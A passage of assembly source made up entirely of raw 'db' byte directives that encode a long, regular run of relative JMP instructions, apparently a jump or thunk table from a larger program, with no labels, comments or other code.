    db 70h,00h,00h,0E9h,0E7h,70h,00h,00h,0E9h,0E2h,70h,00h,00h,0E9h,0DDh,70h
    db 00h,00h,0E9h,0D8h,70h,00h,00h,0E9h,0D3h,70h,00h,00h,0E9h,0CEh,70h,00h
    db 00h,0E9h,0C9h,70h,00h,00h,0E9h,0C4h,70h,00h,00h,0E9h,0BFh,70h,00h,00h
    db 0E9h,0BAh,70h,00h,00h,0E9h,0B5h,70h,00h,00h,0E9h,0B0h,70h,00h,00h,0E9h
    db 0ABh,70h,00h,00h,0E9h,0A6h,70h,00h,00h,0E9h,0A1h,70h,00h,00h,0E9h,9Ch
    db 70h,00h,00h,0E9h,97h,70h,00h,00h,0E9h,92h,70h,00h,00h,0E9h,8Dh,70h
    db 00h,00h,0E9h,88h,70h,00h,00h,0E9h,83h,70h,00h,00h,0E9h,7Eh,70h,00h
    db 00h,0E9h,79h,70h,00h,00h,0E9h,74h,70h,00h,00h,0E9h,6Fh,70h,00h,00h
    db 0E9h,6Ah,70h,00h,00h,0E9h,65h,70h,00h,00h,0E9h,60h,70h,00h,00h,0E9h
    db 5Bh,70h,00h,00h,0E9h,56h,70h,00h,00h,0E9h,51h,70h,00h,00h,0E9h,4Ch
    db 70h,00h,00h,0E9h,47h,70h,00h,00h,0E9h,42h,70h,00h,00h,0E9h,3Dh,70h
    db 00h,00h,0E9h,38h,70h,00h,00h,0E9h,33h,70h,00h,00h,0E9h,2Eh,70h,00h
    db 00h,0E9h,29h,70h,00h,00h,0E9h,24h,70h,00h,00h,0E9h,1Fh,70h,00h,00h
    db 0E9h,1Ah,70h,00h,00h,0E9h,15h,70h,00h,00h,0E9h,10h,70h,00h,00h,0E9h
    db 0Bh,70h,00h,00h,0E9h,06h,70h,00h,00h,0E9h,01h,70h,00h,00h,0E9h,0FCh
    db 6Fh,00h,00h,0E9h,0F7h,6Fh,00h,00h,0E9h,0F2h,6Fh,00h,00h,0E9h,0EDh,6Fh
    db 00h,00h,0E9h,0E8h,6Fh,00h,00h,0E9h,0E3h,6Fh,00h,00h,0E9h,0DEh,6Fh,00h
    db 00h,0E9h,0D9h,6Fh,00h,00h,0E9h,0D4h,6Fh,00h,00h,0E9h,0CFh,6Fh,00h,00h
    db 0E9h,0CAh,6Fh,00h,00h,0E9h,0C5h,6Fh,00h,00h,0E9h,0C0h,6Fh,00h,00h,0E9h
    db 0BBh,6Fh,00h,00h,0E9h,0B6h,6Fh,00h,00h,0E9h,0B1h,6Fh,00h,00h,0E9h,0ACh
    db 6Fh,00h,00h,0E9h,0A7h,6Fh,00h,00h,0E9h,0A2h,6Fh,00h,00h,0E9h,9Dh,6Fh
    db 00h,00h,0E9h,98h,6Fh,00h,00h,0E9h,93h,6Fh,00h,00h,0E9h,8Eh,6Fh,00h
    db 00h,0E9h,89h,6Fh,00h,00h,0E9h,84h,6Fh,00h,00h,0E9h,7Fh,6Fh,00h,00h
    db 0E9h,7Ah,6Fh,00h,00h,0E9h,75h,6Fh,00h,00h,0E9h,70h,6Fh,00h,00h,0E9h
    db 6Bh,6Fh,00h,00h,0E9h,66h,6Fh,00h,00h,0E9h,61h,6Fh,00h,00h,0E9h,5Ch
    db 6Fh,00h,00h,0E9h,57h,6Fh,00h,00h,0E9h,52h,6Fh,00h,00h,0E9h,4Dh,6Fh
    db 00h,00h,0E9h,48h,6Fh,00h,00h,0E9h,43h,6Fh,00h,00h,0E9h,3Eh,6Fh,00h
    db 00h,0E9h,39h,6Fh,00h,00h,0E9h,34h,6Fh,00h,00h,0E9h,2Fh,6Fh,00h,00h
    db 0E9h,2Ah,6Fh,00h,00h,0E9h,25h,6Fh,00h,00h,0E9h,20h,6Fh,00h,00h,0E9h
    db 1Bh,6Fh,00h,00h,0E9h,16h,6Fh,00h,00h,0E9h,11h,6Fh,00h,00h,0E9h,0Ch
    db 6Fh,00h,00h,0E9h,07h,6Fh,00h,00h,0E9h,02h,6Fh,00h,00h,0E9h,0FDh,6Eh
    db 00h,00h,0E9h,0F8h,6Eh,00h,00h,0E9h,0F3h,6Eh,00h,00h,0E9h,0EEh,6Eh,00h
    db 00h,0E9h,0E9h,6Eh,00h,00h,0E9h,0E4h,6Eh,00h,00h,0E9h,0DFh,6Eh,00h,00h
    db 0E9h,0DAh,6Eh,00h,00h,0E9h,0D5h,6Eh,00h,00h,0E9h,0D0h,6Eh,00h,00h,0E9h
    db 0CBh,6Eh,00h,00h,0E9h,0C6h,6Eh,00h,00h,0E9h,0C1h,6Eh,00h,00h,0E9h,0BCh
    db 6Eh,00h,00h,0E9h,0B7h,6Eh,00h,00h,0E9h,0B2h,6Eh,00h,00h,0E9h,0ADh,6Eh
    db 00h,00h,0E9h,0A8h,6Eh,00h,00h,0E9h,0A3h,6Eh,00h,00h,0E9h,9Eh,6Eh,00h
    db 00h,0E9h,99h,6Eh,00h,00h,0E9h,94h,6Eh,00h,00h,0E9h,8Fh,6Eh,00h,00h
    db 0E9h,8Ah,6Eh,00h,00h,0E9h,85h,6Eh,00h,00h,0E9h,80h,6Eh,00h,00h,0E9h
    db 7Bh,6Eh,00h,00h,0E9h,76h,6Eh,00h,00h,0E9h,71h,6Eh,00h,00h,0E9h,6Ch
    db 6Eh,00h,00h,0E9h,67h,6Eh,00h,00h,0E9h,62h,6Eh,00h,00h,0E9h,5Dh,6Eh
    db 00h,00h,0E9h,58h,6Eh,00h,00h,0E9h,53h,6Eh,00h,00h,0E9h,4Eh,6Eh,00h
    db 00h,0E9h,49h,6Eh,00h,00h,0E9h,44h,6Eh,00h,00h,0E9h,3Fh,6Eh,00h,00h
    db 0E9h,3Ah,6Eh,00h,00h,0E9h,35h,6Eh,00h,00h,0E9h,30h,6Eh,00h,00h,0E9h
    db 2Bh,6Eh,00h,00h,0E9h,26h,6Eh,00h,00h,0E9h,21h,6Eh,00h,00h,0E9h,1Ch
    db 6Eh,00h,00h,0E9h,17h,6Eh,00h,00h,0E9h,12h,6Eh,00h,00h,0E9h,0Dh,6Eh
    db 00h,00h,0E9h,08h,6Eh,00h,00h,0E9h,03h,6Eh,00h,00h,0E9h,0FEh,6Dh,00h
    db 00h,0E9h,0F9h,6Dh,00h,00h,0E9h,0F4h,6Dh,00h,00h,0E9h,0EFh,6Dh,00h,00h
    db 0E9h,0EAh,6Dh,00h,00h,0E9h,0E5h,6Dh,00h,00h,0E9h,0E0h,6Dh,00h,00h,0E9h
    db 0DBh,6Dh,00h,00h,0E9h,0D6h,6Dh,00h,00h,0E9h,0D1h,6Dh,00h,00h,0E9h,0CCh
    db 6Dh,00h,00h,0E9h,0C7h,6Dh,00h,00h,0E9h,0C2h,6Dh,00h,00h,0E9h,0BDh,6Dh
    db 00h,00h,0E9h,0B8h,6Dh,00h,00h,0E9h,0B3h,6Dh,00h,00h,0E9h,0AEh,6Dh,00h
    db 00h,0E9h,0A9h,6Dh,00h,00h,0E9h,0A4h,6Dh,00h,00h,0E9h,9Fh,6Dh,00h,00h
    db 0E9h,9Ah,6Dh,00h,00h,0E9h,95h,6Dh,00h,00h,0E9h,90h,6Dh,00h,00h,0E9h
    db 8Bh,6Dh,00h,00h,0E9h,86h,6Dh,00h,00h,0E9h,81h,6Dh,00h,00h,0E9h,7Ch
    db 6Dh,00h,00h,0E9h,77h,6Dh,00h,00h,0E9h,72h,6Dh,00h,00h,0E9h,6Dh,6Dh
    db 00h,00h,0E9h,68h,6Dh,00h,00h,0E9h,63h,6Dh,00h,00h,0E9h,5Eh,6Dh,00h
    db 00h,0E9h,59h,6Dh,00h,00h,0E9h,54h,6Dh,00h,00h,0E9h,4Fh,6Dh,00h,00h
    db 0E9h,4Ah,6Dh,00h,00h,0E9h,45h,6Dh,00h,00h,0E9h,40h,6Dh,00h,00h,0E9h
    db 3Bh,6Dh,00h,00h,0E9h,36h,6Dh,00h,00h,0E9h,31h,6Dh,00h,00h,0E9h,2Ch
    db 6Dh,00h,00h,0E9h,27h,6Dh,00h,00h,0E9h,22h,6Dh,00h,00h,0E9h,1Dh,6Dh
    db 00h,00h,0E9h,18h,6Dh,00h,00h,0E9h,13h,6Dh,00h,00h,0E9h,0Eh,6Dh,00h
    db 00h,0E9h,09h,6Dh,00h,00h,0E9h,04h,6Dh,00h,00h,0E9h,0FFh,6Ch,00h,00h
    db 0E9h,0FAh,6Ch,00h,00h,0E9h,0F5h,6Ch,00h,00h,0E9h,0F0h,6Ch,00h,00h,0E9h
    db 0EBh,6Ch,00h,00h,0E9h,0E6h,6Ch,00h,00h,0E9h,0E1h,6Ch,00h,00h,0E9h,0DCh
    db 6Ch,00h,00h,0E9h,0D7h,6Ch,00h,00h,0E9h,0D2h,6Ch,00h,00h,0E9h,0CDh,6Ch
    db 00h,00h,0E9h,0C8h,6Ch,00h,00h,0E9h,0C3h,6Ch,00h,00h,0E9h,0BEh,6Ch,00h
    db 00h,0E9h,0B9h,6Ch,00h,00h,0E9h,0B4h,6Ch,00h,00h,0E9h,0AFh,6Ch,00h,00h
    db 0E9h,0AAh,6Ch,00h,00h,0E9h,0A5h,6Ch,00h,00h,0E9h,0A0h,6Ch,00h,00h,0E9h
    db 9Bh,6Ch,00h,00h,0E9h,96h,6Ch,00h,00h,0E9h,91h,6Ch,00h,00h,0E9h,8Ch
    db 6Ch,00h,00h,0E9h,87h,6Ch,00h,00h,0E9h,82h,6Ch,00h,00h,0E9h,7Dh,6Ch
    db 00h,00h,0E9h,78h,6Ch,00h,00h,0E9h,73h,6Ch,00h,00h,0E9h,6Eh,6Ch,00h
    db 00h,0E9h,69h,6Ch,00h,00h,0E9h,64h,6Ch,00h,00h,0E9h,5Fh,6Ch,00h,00h
    db 0E9h,5Ah,6Ch,00h,00h,0E9h,55h,6Ch,00h,00h,0E9h,50h,6Ch,00h,00h,0E9h
    db 4Bh,6Ch,00h,00h,0E9h,46h,6Ch,00h,00h,0E9h,41h,6Ch,00h,00h,0E9h,3Ch
    db 6Ch,00h,00h,0E9h,37h,6Ch,00h,00h,0E9h,32h,6Ch,00h,00h,0E9h,2Dh,6Ch
    db 00h,00h,0E9h,28h,6Ch,00h,00h,0E9h,23h,6Ch,00h,00h,0E9h,1Eh,6Ch,00h
    db 00h,0E9h,19h,6Ch,00h,00h,0E9h,14h,6Ch,00h,00h,0E9h,0Fh,6Ch,00h,00h
    db 0E9h,0Ah,6Ch,00h,00h,0E9h,05h,6Ch,00h,00h,0E9h,00h,6Ch,00h,00h,0E9h
    db 0FBh,6Bh,00h,00h,0E9h,0F6h,6Bh,00h,00h,0E9h,0F1h,6Bh,00h,00h,0E9h,0ECh
    db 6Bh,00h,00h,0E9h,0E7h,6Bh,00h,00h,0E9h,0E2h,6Bh,00h,00h,0E9h,0DDh,6Bh
    db 00h,00h,0E9h,0D8h,6Bh,00h,00h,0E9h,0D3h,6Bh,00h,00h,0E9h,0CEh,6Bh,00h
    db 00h,0E9h,0C9h,6Bh,00h,00h,0E9h,0C4h,6Bh,00h,00h,0E9h,0BFh,6Bh,00h,00h
    db 0E9h,0BAh,6Bh,00h,00h,0E9h,0B5h,6Bh,00h,00h,0E9h,0B0h,6Bh,00h,00h,0E9h
    db 0ABh,6Bh,00h,00h,0E9h,0A6h,6Bh,00h,00h,0E9h,0A1h,6Bh,00h,00h,0E9h,9Ch
    db 6Bh,00h,00h,0E9h,97h,6Bh,00h,00h,0E9h,92h,6Bh,00h,00h,0E9h,8Dh,6Bh
    db 00h,00h,0E9h,88h,6Bh,00h,00h,0E9h,83h,6Bh,00h,00h,0E9h,7Eh,6Bh,00h
    db 00h,0E9h,79h,6Bh,00h,00h,0E9h,74h,6Bh,00h,00h,0E9h,6Fh,6Bh,00h,00h
    db 0E9h,6Ah,6Bh,00h,00h,0E9h,65h,6Bh,00h,00h,0E9h,60h,6Bh,00h,00h,0E9h
    db 5Bh,6Bh,00h,00h,0E9h,56h,6Bh,00h,00h,0E9h,51h,6Bh,00h,00h,0E9h,4Ch
    db 6Bh,00h,00h,0E9h,47h,6Bh,00h,00h,0E9h,42h,6Bh,00h,00h,0E9h,3Dh,6Bh
    db 00h,00h,0E9h,38h,6Bh,00h,00h,0E9h,33h,6Bh,00h,00h,0E9h,2Eh,6Bh,00h
    db 00h,0E9h,29h,6Bh,00h,00h,0E9h,24h,6Bh,00h,00h,0E9h,1Fh,6Bh,00h,00h
    db 0E9h,1Ah,6Bh,00h,00h,0E9h,15h,6Bh,00h,00h,0E9h,10h,6Bh,00h,00h,0E9h
    db 0Bh,6Bh,00h,00h,0E9h,06h,6Bh,00h,00h,0E9h,01h,6Bh,00h,00h,0E9h,0FCh
    db 6Ah,00h,00h,0E9h,0F7h,6Ah,00h,00h,0E9h,0F2h,6Ah,00h,00h,0E9h,0EDh,6Ah
    db 00h,00h,0E9h,0E8h,6Ah,00h,00h,0E9h,0E3h,6Ah,00h,00h,0E9h,0DEh,6Ah,00h
    db 00h,0E9h,0D9h,6Ah,00h,00h,0E9h,0D4h,6Ah,00h,00h,0E9h,0CFh,6Ah,00h,00h
    db 0E9h,0CAh,6Ah,00h,00h,0E9h,0C5h,6Ah,00h,00h,0E9h,0C0h,6Ah,00h,00h,0E9h
    db 0BBh,6Ah,00h,00h,0E9h,0B6h,6Ah,00h,00h,0E9h,0B1h,6Ah,00h,00h,0E9h,0ACh
    db 6Ah,00h,00h,0E9h,0A7h,6Ah,00h,00h,0E9h,0A2h,6Ah,00h,00h,0E9h,9Dh,6Ah
    db 00h,00h,0E9h,98h,6Ah,00h,00h,0E9h,93h,6Ah,00h,00h,0E9h,8Eh,6Ah,00h
    db 00h,0E9h,89h,6Ah,00h,00h,0E9h,84h,6Ah,00h,00h,0E9h,7Fh,6Ah,00h,00h
    db 0E9h,7Ah,6Ah,00h,00h,0E9h,75h,6Ah,00h,00h,0E9h,70h,6Ah,00h,00h,0E9h
    db 6Bh,6Ah,00h,00h,0E9h,66h,6Ah,00h,00h,0E9h,61h,6Ah,00h,00h,0E9h,5Ch
    db 6Ah,00h,00h,0E9h,57h,6Ah,00h,00h,0E9h,52h,6Ah,00h,00h,0E9h,4Dh,6Ah
    db 00h,00h,0E9h,48h,6Ah,00h,00h,0E9h,43h,6Ah,00h,00h,0E9h,3Eh,6Ah,00h
    db 00h,0E9h,39h,6Ah,00h,00h,0E9h,34h,6Ah,00h,00h,0E9h,2Fh,6Ah,00h,00h
    db 0E9h,2Ah,6Ah,00h,00h,0E9h,25h,6Ah,00h,00h,0E9h,20h,6Ah,00h,00h,0E9h
    db 1Bh,6Ah,00h,00h,0E9h,16h,6Ah,00h,00h,0E9h,11h,6Ah,00h,00h,0E9h,0Ch
    db 6Ah,00h,00h,0E9h,07h,6Ah,00h,00h,0E9h,02h,6Ah,00h,00h,0E9h,0FDh,69h
    db 00h,00h,0E9h,0F8h,69h,00h,00h,0E9h,0F3h,69h,00h,00h,0E9h,0EEh,69h,00h
    db 00h,0E9h,0E9h,69h,00h,00h,0E9h,0E4h,69h,00h,00h,0E9h,0DFh,69h,00h,00h
    db 0E9h,0DAh,69h,00h,00h,0E9h,0D5h,69h,00h,00h,0E9h,0D0h,69h,00h,00h,0E9h
    db 0CBh,69h,00h,00h,0E9h,0C6h,69h,00h,00h,0E9h,0C1h,69h,00h,00h,0E9h,0BCh
    db 69h,00h,00h,0E9h,0B7h,69h,00h,00h,0E9h,0B2h,69h,00h,00h,0E9h,0ADh,69h
    db 00h,00h,0E9h,0A8h,69h,00h,00h,0E9h,0A3h,69h,00h,00h,0E9h,9Eh,69h,00h
    db 00h,0E9h,99h,69h,00h,00h,0E9h,94h,69h,00h,00h,0E9h,8Fh,69h,00h,00h
    db 0E9h,8Ah,69h,00h,00h,0E9h,85h,69h,00h,00h,0E9h,80h,69h,00h,00h,0E9h
    db 7Bh,69h,00h,00h,0E9h,76h,69h,00h,00h,0E9h,71h,69h,00h,00h,0E9h,6Ch
    db 69h,00h,00h,0E9h,67h,69h,00h,00h,0E9h,62h,69h,00h,00h,0E9h,5Dh,69h
    db 00h,00h,0E9h,58h,69h,00h,00h,0E9h,53h,69h,00h,00h,0E9h,4Eh,69h,00h
    db 00h,0E9h,49h,69h,00h,00h,0E9h,44h,69h,00h,00h,0E9h,3Fh,69h,00h,00h
    db 0E9h,3Ah,69h,00h,00h,0E9h,35h,69h,00h,00h,0E9h,30h,69h,00h,00h,0E9h
    db 2Bh,69h,00h,00h,0E9h,26h,69h,00h,00h,0E9h,21h,69h,00h,00h,0E9h,1Ch
    db 69h,00h,00h,0E9h,17h,69h,00h,00h,0E9h,12h,69h,00h,00h,0E9h,0Dh,69h
    db 00h,00h,0E9h,08h,69h,00h,00h,0E9h,03h,69h,00h,00h,0E9h,0FEh,68h,00h
    db 00h,0E9h,0F9h,68h,00h,00h,0E9h,0F4h,68h,00h,00h,0E9h,0EFh,68h,00h,00h
    db 0E9h,0EAh,68h,00h,00h,0E9h,0E5h,68h,00h,00h,0E9h,0E0h,68h,00h,00h,0E9h
    db 0DBh,68h,00h,00h,0E9h,0D6h,68h,00h,00h,0E9h,0D1h,68h,00h,00h,0E9h,0CCh
    db 68h,00h,00h,0E9h,0C7h,68h,00h,00h,0E9h,0C2h,68h,00h,00h,0E9h,0BDh,68h
    db 00h,00h,0E9h,0B8h,68h,00h,00h,0E9h,0B3h,68h,00h,00h,0E9h,0AEh,68h,00h
    db 00h,0E9h,0A9h,68h,00h,00h,0E9h,0A4h,68h,00h,00h,0E9h,9Fh,68h,00h,00h
    db 0E9h,9Ah,68h,00h,00h,0E9h,95h,68h,00h,00h,0E9h,90h,68h,00h,00h,0E9h
    db 8Bh,68h,00h,00h,0E9h,86h,68h,00h,00h,0E9h,81h,68h,00h,00h,0E9h,7Ch
    db 68h,00h,00h,0E9h,77h,68h,00h,00h,0E9h,72h,68h,00h,00h,0E9h,6Dh,68h
    db 00h,00h,0E9h,68h,68h,00h,00h,0E9h,63h,68h,00h,00h,0E9h,5Eh,68h,00h
    db 00h,0E9h,59h,68h,00h,00h,0E9h,54h,68h,00h,00h,0E9h,4Fh,68h,00h,00h
    db 0E9h,4Ah,68h,00h,00h,0E9h,45h,68h,00h,00h,0E9h,40h,68h,00h,00h,0E9h
    db 3Bh,68h,00h,00h,0E9h,36h,68h,00h,00h,0E9h,31h,68h,00h,00h,0E9h,2Ch
    db 68h,00h,00h,0E9h,27h,68h,00h,00h,0E9h,22h,68h,00h,00h,0E9h,1Dh,68h
    db 00h,00h,0E9h,18h,68h,00h,00h,0E9h,13h,68h,00h,00h,0E9h,0Eh,68h,00h
    db 00h,0E9h,09h,68h,00h,00h,0E9h,04h,68h,00h,00h,0E9h,0FFh,67h,00h,00h
    db 0E9h,0FAh,67h,00h,00h,0E9h,0F5h,67h,00h,00h,0E9h,0F0h,67h,00h,00h,0E9h
    db 0EBh,67h,00h,00h,0E9h,0E6h,67h,00h,00h,0E9h,0E1h,67h,00h,00h,0E9h,0DCh
    db 67h,00h,00h,0E9h,0D7h,67h,00h,00h,0E9h,0D2h,67h,00h,00h,0E9h,0CDh,67h
    db 00h,00h,0E9h,0C8h,67h,00h,00h,0E9h,0C3h,67h,00h,00h,0E9h,0BEh,67h,00h
    db 00h,0E9h,0B9h,67h,00h,00h,0E9h,0B4h,67h,00h,00h,0E9h,0AFh,67h,00h,00h
    db 0E9h,0AAh,67h,00h,00h,0E9h,0A5h,67h,00h,00h,0E9h,0A0h,67h,00h,00h,0E9h
    db 9Bh,67h,00h,00h,0E9h,96h,67h,00h,00h,0E9h,91h,67h,00h,00h,0E9h,8Ch
    db 67h,00h,00h,0E9h,87h,67h,00h,00h,0E9h,82h,67h,00h,00h,0E9h,7Dh,67h
    db 00h,00h,0E9h,78h,67h,00h,00h,0E9h,73h,67h,00h,00h,0E9h,6Eh,67h,00h
    db 00h,0E9h,69h,67h,00h,00h,0E9h,64h,67h,00h,00h,0E9h,5Fh,67h,00h,00h
    db 0E9h,5Ah,67h,00h,00h,0E9h,55h,67h,00h,00h,0E9h,50h,67h,00h,00h,0E9h
    db 4Bh,67h,00h,00h,0E9h,46h,67h,00h,00h,0E9h,41h,67h,00h,00h,0E9h,3Ch
    db 67h,00h,00h,0E9h,37h,67h,00h,00h,0E9h,32h,67h,00h,00h,0E9h,2Dh,67h
    db 00h,00h,0E9h,28h,67h,00h,00h,0E9h,23h,67h,00h,00h,0E9h,1Eh,67h,00h
    db 00h,0E9h,19h,67h,00h,00h,0E9h,14h,67h,00h,00h,0E9h,0Fh,67h,00h,00h
    db 0E9h,0Ah,67h,00h,00h,0E9h,05h,67h,00h,00h,0E9h,00h,67h,00h,00h,0E9h
    db 0FBh,66h,00h,00h,0E9h,0F6h,66h,00h,00h,0E9h,0F1h,66h,00h,00h,0E9h,0ECh
    db 66h,00h,00h,0E9h,0E7h,66h,00h,00h,0E9h,0E2h,66h,00h,00h,0E9h,0DDh,66h
    db 00h,00h,0E9h,0D8h,66h,00h,00h,0E9h,0D3h,66h,00h,00h,0E9h,0CEh,66h,00h
    db 00h,0E9h,0C9h,66h,00h,00h,0E9h,0C4h,66h,00h,00h,0E9h,0BFh,66h,00h,00h
    db 0E9h,0BAh,66h,00h,00h,0E9h,0B5h,66h,00h,00h,0E9h,0B0h,66h,00h,00h,0E9h
    db 0ABh,66h,00h,00h,0E9h,0A6h,66h,00h,00h,0E9h,0A1h,66h,00h,00h,0E9h,9Ch
    db 66h,00h,00h,0E9h,97h,66h,00h,00h,0E9h,92h,66h,00h,00h,0E9h,8Dh,66h
    db 00h,00h,0E9h,88h,66h,00h,00h,0E9h,83h,66h,00h,00h,0E9h,7Eh,66h,00h
    db 00h,0E9h,79h,66h,00h,00h,0E9h,74h,66h,00h,00h,0E9h,6Fh,66h,00h,00h
    db 0E9h,6Ah,66h,00h,00h,0E9h,65h,66h,00h,00h,0E9h,60h,66h,00h,00h,0E9h
    db 5Bh,66h,00h,00h,0E9h,56h,66h,00h,00h,0E9h,51h,66h,00h,00h,0E9h,4Ch
    db 66h,00h,00h,0E9h,47h,66h,00h,00h,0E9h,42h,66h,00h,00h,0E9h,3Dh,66h
    db 00h,00h,0E9h,38h,66h,00h,00h,0E9h,33h,66h,00h,00h,0E9h,2Eh,66h,00h
    db 00h,0E9h,29h,66h,00h,00h,0E9h,24h,66h,00h,00h,0E9h,1Fh,66h,00h,00h
    db 0E9h,1Ah,66h,00h,00h,0E9h,15h,66h,00h,00h,0E9h,10h,66h,00h,00h,0E9h
    db 0Bh,66h,00h,00h,0E9h,06h,66h,00h,00h,0E9h,01h,66h,00h,00h,0E9h,0FCh
    db 65h,00h,00h,0E9h,0F7h,65h,00h,00h,0E9h,0F2h,65h,00h,00h,0E9h,0EDh,65h
    db 00h,00h,0E9h,0E8h,65h,00h,00h,0E9h,0E3h,65h,00h,00h,0E9h,0DEh,65h,00h
    db 00h,0E9h,0D9h,65h,00h,00h,0E9h,0D4h,65h,00h,00h,0E9h,0CFh,65h,00h,00h
    db 0E9h,0CAh,65h,00h,00h,0E9h,0C5h,65h,00h,00h,0E9h,0C0h,65h,00h,00h,0E9h
    db 0BBh,65h,00h,00h,0E9h,0B6h,65h,00h,00h,0E9h,0B1h,65h,00h,00h,0E9h,0ACh
    db 65h,00h,00h,0E9h,0A7h,65h,00h,00h,0E9h,0A2h,65h,00h,00h,0E9h,9Dh,65h
    db 00h,00h,0E9h,98h,65h,00h,00h,0E9h,93h,65h,00h,00h,0E9h,8Eh,65h,00h
    db 00h,0E9h,89h,65h,00h,00h,0E9h,84h,65h,00h,00h,0E9h,7Fh,65h,00h,00h
    db 0E9h,7Ah,65h,00h,00h,0E9h,75h,65h,00h,00h,0E9h,70h,65h,00h,00h,0E9h
    db 6Bh,65h,00h,00h,0E9h,66h,65h,00h,00h,0E9h,61h,65h,00h,00h,0E9h,5Ch
    db 65h,00h,00h,0E9h,57h,65h,00h,00h,0E9h,52h,65h,00h,00h,0E9h,4Dh,65h
    db 00h,00h,0E9h,48h,65h,00h,00h,0E9h,43h,65h,00h,00h,0E9h,3Eh,65h,00h
    db 00h,0E9h,39h,65h,00h,00h,0E9h,34h,65h,00h,00h,0E9h,2Fh,65h,00h,00h
    db 0E9h,2Ah,65h,00h,00h,0E9h,25h,65h,00h,00h,0E9h,20h,65h,00h,00h,0E9h
    db 1Bh,65h,00h,00h,0E9h,16h,65h,00h,00h,0E9h,11h,65h,00h,00h,0E9h,0Ch
    db 65h,00h,00h,0E9h,07h,65h,00h,00h,0E9h,02h,65h,00h,00h,0E9h,0FDh,64h
    db 00h,00h,0E9h,0F8h,64h,00h,00h,0E9h,0F3h,64h,00h,00h,0E9h,0EEh,64h,00h
    db 00h,0E9h,0E9h,64h,00h,00h,0E9h,0E4h,64h,00h,00h,0E9h,0DFh,64h,00h,00h
    db 0E9h,0DAh,64h,00h,00h,0E9h,0D5h,64h,00h,00h,0E9h,0D0h,64h,00h,00h,0E9h
    db 0CBh,64h,00h,00h,0E9h,0C6h,64h,00h,00h,0E9h,0C1h,64h,00h,00h,0E9h,0BCh
    db 64h,00h,00h,0E9h,0B7h,64h,00h,00h,0E9h,0B2h,64h,00h,00h,0E9h,0ADh,64h
    db 00h,00h,0E9h,0A8h,64h,00h,00h,0E9h,0A3h,64h,00h,00h,0E9h,9Eh,64h,00h
    db 00h,0E9h,99h,64h,00h,00h,0E9h,94h,64h,00h,00h,0E9h,8Fh,64h,00h,00h
    db 0E9h,8Ah,64h,00h,00h,0E9h,85h,64h,00h,00h,0E9h,80h,64h,00h,00h,0E9h
    db 7Bh,64h,00h,00h,0E9h,76h,64h,00h,00h,0E9h,71h,64h,00h,00h,0E9h,6Ch
    db 64h,00h,00h,0E9h,67h,64h,00h,00h,0E9h,62h,64h,00h,00h,0E9h,5Dh,64h
    db 00h,00h,0E9h,58h,64h,00h,00h,0E9h,53h,64h,00h,00h,0E9h,4Eh,64h,00h
    db 00h,0E9h,49h,64h,00h,00h,0E9h,44h,64h,00h,00h,0E9h,3Fh,64h,00h,00h
    db 0E9h,3Ah,64h,00h,00h,0E9h,35h,64h,00h,00h,0E9h,30h,64h,00h,00h,0E9h
    db 2Bh,64h,00h,00h,0E9h,26h,64h,00h,00h,0E9h,21h,64h,00h,00h,0E9h,1Ch
    db 64h,00h,00h,0E9h,17h,64h,00h,00h,0E9h,12h,64h,00h,00h,0E9h,0Dh,64h
    db 00h,00h,0E9h,08h,64h,00h,00h,0E9h,03h,64h,00h,00h,0E9h,0FEh,63h,00h
    db 00h,0E9h,0F9h,63h,00h,00h,0E9h,0F4h,63h,00h,00h,0E9h,0EFh,63h,00h,00h
    db 0E9h,0EAh,63h,00h,00h,0E9h,0E5h,63h,00h,00h,0E9h,0E0h,63h,00h,00h,0E9h
    db 0DBh,63h,00h,00h,0E9h,0D6h,63h,00h,00h,0E9h,0D1h,63h,00h,00h,0E9h,0CCh
    db 63h,00h,00h,0E9h,0C7h,63h,00h,00h,0E9h,0C2h,63h,00h,00h,0E9h,0BDh,63h
    db 00h,00h,0E9h,0B8h,63h,00h,00h,0E9h,0B3h,63h,00h,00h,0E9h,0AEh,63h,00h
    db 00h,0E9h,0A9h,63h,00h,00h,0E9h,0A4h,63h,00h,00h,0E9h,9Fh,63h,00h,00h
    db 0E9h,9Ah,63h,00h,00h,0E9h,95h,63h,00h,00h,0E9h,90h,63h,00h,00h,0E9h
    db 8Bh,63h,00h,00h,0E9h,86h,63h,00h,00h,0E9h,81h,63h,00h,00h,0E9h,7Ch
    db 63h,00h,00h,0E9h,77h,63h,00h,00h,0E9h,72h,63h,00h,00h,0E9h,6Dh,63h
    db 00h,00h,0E9h,68h,63h,00h,00h,0E9h,63h,63h,00h,00h,0E9h,5Eh,63h,00h
    db 00h,0E9h,59h,63h,00h,00h,0E9h,54h,63h,00h,00h,0E9h,4Fh,63h,00h,00h
    db 0E9h,4Ah,63h,00h,00h,0E9h,45h,63h,00h,00h,0E9h,40h,63h,00h,00h,0E9h
    db 3Bh,63h,00h,00h,0E9h,36h,63h,00h,00h,0E9h,31h,63h,00h,00h,0E9h,2Ch
    db 63h,00h,00h,0E9h,27h,63h,00h,00h,0E9h,22h,63h,00h,00h,0E9h,1Dh,63h
    db 00h,00h,0E9h,18h,63h,00h,00h,0E9h,13h,63h,00h,00h,0E9h,0Eh,63h,00h
    db 00h,0E9h,09h,63h,00h,00h,0E9h,04h,63h,00h,00h,0E9h,0FFh,62h,00h,00h
    db 0E9h,0FAh,62h,00h,00h,0E9h,0F5h,62h,00h,00h,0E9h,0F0h,62h,00h,00h,0E9h
    db 0EBh,62h,00h,00h,0E9h,0E6h,62h,00h,00h,0E9h,0E1h,62h,00h,00h,0E9h,0DCh
    db 62h,00h,00h,0E9h,0D7h,62h,00h,00h,0E9h,0D2h,62h,00h,00h,0E9h,0CDh,62h
    db 00h,00h,0E9h,0C8h,62h,00h,00h,0E9h,0C3h,62h,00h,00h,0E9h,0BEh,62h,00h
    db 00h,0E9h,0B9h,62h,00h,00h,0E9h,0B4h,62h,00h,00h,0E9h,0AFh,62h,00h,00h
    db 0E9h,0AAh,62h,00h,00h,0E9h,0A5h,62h,00h,00h,0E9h,0A0h,62h,00h,00h,0E9h
    db 9Bh,62h,00h,00h,0E9h,96h,62h,00h,00h,0E9h,91h,62h,00h,00h,0E9h,8Ch
    db 62h,00h,00h,0E9h,87h,62h,00h,00h,0E9h,82h,62h,00h,00h,0E9h,7Dh,62h
    db 00h,00h,0E9h,78h,62h,00h,00h,0E9h,73h,62h,00h,00h,0E9h,6Eh,62h,00h
    db 00h,0E9h,69h,62h,00h,00h,0E9h,64h,62h,00h,00h,0E9h,5Fh,62h,00h,00h
    db 0E9h,5Ah,62h,00h,00h,0E9h,55h,62h,00h,00h,0E9h,50h,62h,00h,00h,0E9h
